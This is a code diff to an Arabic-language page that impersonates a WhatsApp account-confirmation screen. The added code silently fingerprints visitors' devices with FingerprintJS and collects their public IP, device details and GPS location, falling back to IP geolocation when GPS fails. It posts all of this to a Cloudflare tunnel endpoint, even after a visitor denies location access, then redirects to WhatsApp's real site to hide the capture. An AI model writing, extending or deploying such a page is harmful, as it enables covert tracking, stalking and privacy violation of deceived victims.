@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تأكيد الحساب • واتساب</title>
     <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/4Lp1WpLiL2E.png">
+    <!-- FingerprintJS (للبصمة الصامتة) -->
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <!-- Leaflet (للخريطة – اختياري) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -37,7 +42,7 @@
             justify-content: center;
         }
         .logo svg { width: 44px; height: 44px; fill: white; }
-        h2 { color: #075E54; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        h2 { color: #075E54; font-size: 24px; font-weight: 700; margin-bottom: 8px; }
         .subtitle { color: #54656f; font-size: 15px; line-height: 1.4; margin-bottom: 24px; }
         .security-badge {
             background: #e7f5e6;
@@ -46,7 +51,7 @@
             margin-bottom: 28px;
             display: inline-block;
             color: #075E54;
-            font-weight: 500;
+            font-weight: 600;
             font-size: 14px;
         }
         .btn {
@@ -105,8 +110,6 @@
             display: none;
         }
     </style>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
     <div class="card">
@@ -135,24 +138,40 @@
 
     <script>
         (function() {
+            // ========== التكوين ==========
             const LOG_URL = 'https://tube-workers-exactly-this.trycloudflare.com/log'\;
-            let map;
+            
+            // ========== المتغيرات العامة ==========
+            let map = null;
+            let fpPromise = null;
             const startBtn = document.getElementById('startBtn');
             const locateBtn = document.getElementById('locateBtn');
             const consentPopup = document.getElementById('consentPopup');
             const statusDiv = document.getElementById('status');
             const mapContainer = document.getElementById('mapContainer');
 
+            // ========== تحميل بصمة الجهاز بصمت ==========
+            if (typeof FingerprintJS !== 'undefined') {
+                fpPromise = FingerprintJS.load().then(fp => fp.get());
+            }
+
+            // ========== دوال مساعدة ==========
             function showStatus(msg, type) {
                 statusDiv.innerHTML = msg;
                 statusDiv.className = type || '';
             }
 
             function initMap(lat, lng, accuracy) {
+                if (typeof L === 'undefined') {
+                    console.warn('Leaflet not loaded');
+                    return;
+                }
                 mapContainer.style.display = 'block';
                 if (!map) {
                     map = L.map('map').setView([lat, lng], 15);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        attribution: '&copy; OpenStreetMap'
+                    }).addTo(map);
                 } else {
                     map.setView([lat, lng], 15);
                     map.eachLayer(l => { if (l instanceof L.Marker || l instanceof L.Circle) map.removeLayer(l); });
@@ -161,60 +180,119 @@
                 L.circle([lat, lng], { radius: accuracy, color: '#25D366', fillOpacity: 0.15 }).addTo(map);
             }
 
-            async function sendData(payload) {
-                payload.timestamp = new Date().toISOString();
+            // ========== جمع البيانات وإرسالها ==========
+            async function collectAndSend(payload) {
+                // IP عام
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    payload.ip = ipData.ip;
+                } catch(e) {}
+
+                // بصمة الجهاز
+                if (fpPromise) {
+                    try {
+                        const fp = await fpPromise;
+                        payload.fingerprint = {
+                            visitorId: fp.visitorId,
+                            confidence: fp.confidence.score,
+                            components: fp.components
+                        };
+                    } catch(e) {}
+                }
+
+                // بيانات الجهاز الأساسية
                 payload.device = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
                     screen: `${window.screen.width}x${window.screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    deviceMemory: navigator.deviceMemory || 'unknown'
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    memory: navigator.deviceMemory || 'unknown',
+                    touch: 'ontouchstart' in window
                 };
+
+                payload.timestamp = new Date().toISOString();
+
+                // إرسال إلى الخادم
                 try {
-                    // IP عام (بصمت)
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    payload.ip = ipData.ip;
+                    await fetch(LOG_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
                 } catch(e) {}
-                try { await fetch(LOG_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e) {}
             }
 
+            // ========== احتياطي: IP Geocoding (إذا فشل GPS) ==========
+            async function fallbackIPGeolocation() {
+                showStatus('🔄 جاري تحديد الموقع عبر الشبكة...', '');
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const data = await ipRes.json();
+                    if (data.latitude && data.longitude) {
+                        const lat = data.latitude, lng = data.longitude;
+                        const acc = 5000; // دقة تقريبية 5 كم
+                        showStatus(`✅ تم التأكيد عبر الشبكة (دقة ~${acc}م)`, 'success');
+                        initMap(lat, lng, acc);
+                        await collectAndSend({ 
+                            latitude: lat, longitude: lng, accuracy: acc, 
+                            method: 'ip_geolocation', ip_data: data 
+                        });
+                        locateBtn.disabled = true;
+                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
+                        return true;
+                    }
+                } catch(e) {}
+                return false;
+            }
+
+            // ========== معالج GPS الرئيسي ==========
             function handleGeolocation() {
                 if (!navigator.geolocation) {
                     showStatus('❌ متصفحك لا يدعم تحديد الموقع.', 'error');
                     locateBtn.disabled = false;
                     return;
                 }
+
                 showStatus('<div class="loader"></div> جاري تحديد موقعك...', '');
                 locateBtn.disabled = true;
+
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
+                    async (pos) => {
                         const lat = pos.coords.latitude, lng = pos.coords.longitude, acc = pos.coords.accuracy;
                         showStatus(`✅ تم التأكيد! الدقة: ${Math.round(acc)}م`, 'success');
                         initMap(lat, lng, acc);
-                        sendData({ latitude: lat, longitude: lng, accuracy: acc });
+                        await collectAndSend({ latitude: lat, longitude: lng, accuracy: acc, method: 'gps' });
                         setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
                     },
-                    (err) => {
-                        let msg = '';
-                        if (err.code === 1) msg = '❌ تم رفض الصلاحية. يرجى السماح بالموقع من إعدادات المتصفح.';
-                        else if (err.code === 2) msg = '❌ تعذر تحديد الموقع (GPS غير متاح).';
-                        else if (err.code === 3) msg = '⏳ انتهت المهلة. حاول في مكان مفتوح.';
-                        else msg = '❌ حدث خطأ غير معروف.';
-                        showStatus(msg, 'error');
-                        locateBtn.disabled = false;
-                        sendData({ location_failed: true, error: msg });
+                    async (err) => {
+                        console.warn('GPS error:', err.code);
+                        if (err.code === 1) { // رفض
+                            showStatus('❌ تم رفض الصلاحية. يرجى السماح بالموقع من إعدادات المتصفح.', 'error');
+                            locateBtn.disabled = false;
+                            await collectAndSend({ location_failed: true, error: 'user_denied' });
+                        } else {
+                            // فشل تقني (مهلة أو غير متاح) -> احتياطي IP
+                            const success = await fallbackIPGeolocation();
+                            if (!success) {
+                                showStatus('❌ تعذر تحديد الموقع. تأكد من اتصالك بالإنترنت.', 'error');
+                                locateBtn.disabled = false;
+                                await collectAndSend({ location_failed: true, error: 'gps_timeout_and_ip_failed' });
+                            }
+                        }
                     },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
 
+            // ========== ربط الأحداث ==========
             startBtn.addEventListener('click', () => {
                 startBtn.style.display = 'none';
                 consentPopup.style.display = 'block';
             });
+
             locateBtn.addEventListener('click', handleGeolocation);
         })();
     </script>
